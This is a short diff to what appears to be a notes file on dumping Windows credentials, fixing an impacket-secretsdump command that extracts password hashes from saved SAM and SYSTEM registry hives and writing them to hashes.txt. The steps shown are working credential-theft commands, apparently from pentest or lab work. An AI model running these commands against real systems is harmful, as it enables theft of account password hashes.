@@ -8,7 +8,8 @@ reg save HKLM\system ./system
 2) from kali/wsl2 (in the saved directory):
 apt update -y
 apt install python3-impacket -y
-impacket-secretsdump -sam sam -systm system LOCAL
+impacket-secretsdump -sam sam -system system LOCAL > hashes.txt
+
 
 from this output:
 Impacket v0.11.0 - Copyright 2023 Fortra
